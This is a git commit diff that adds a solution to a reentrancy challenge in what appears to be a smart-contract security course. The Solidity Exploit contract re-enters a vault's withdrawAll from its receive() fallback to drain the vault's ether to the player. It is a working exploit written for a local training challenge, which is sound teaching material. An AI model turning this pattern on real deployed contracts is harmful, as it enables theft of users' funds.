aae250845b34ace38579b648ea5e6f6e535f7ee5
yu1hpa <yu.1hpa@gmail.com>
2023-09-12 23:36:31 +0900

    feat: Implement Reentrancy Attack Exploit Code

--- course/reentrancy/challenge-single-function/Challenge.t.sol
+++ course/reentrancy/challenge-single-function/Challenge.t.sol
@@ -21,7 +21,10 @@ contract ChallengeTest is Test {
         vm.startPrank(playerAddress, playerAddress);
 
         ////////// YOUR CODE GOES HERE //////////
+        Exploit exploitContract = new Exploit(address(setup.vault()), payable(playerAddress));
+        vm.deal(address(exploitContract), 1 ether);
 
+        exploitContract.run();
         ////////// YOUR CODE END //////////
 
         assertTrue(setup.isSolved(), "challenge not solved");
@@ -33,5 +36,34 @@ contract ChallengeTest is Test {
 }
 
 ////////// YOUR CODE GOES HERE //////////
+interface VaultInterface {
+    function deposit() external payable;
+    function withdrawAll() external;
+}
 
+contract Exploit {
+    VaultInterface public vaultContract;
+    address payable public player;
+
+    event Received(address, uint256);
+
+    constructor(address addr, address payable player_) {
+        vaultContract = VaultInterface(addr);
+        player = player_;
+    }
+
+    receive() external payable {
+        if (address(vaultContract).balance > 0) {
+            vaultContract.withdrawAll();
+        }
+        emit Received(msg.sender, msg.sender.balance);
+        player.transfer(address(this).balance);
+    }
+
+    function run() external payable {
+        // [Challenge.sol L12] Satisfy
+        vaultContract.deposit{value: 1 ether}();
+        vaultContract.withdrawAll();
+    }
+}
 ////////// YOUR CODE END //////////
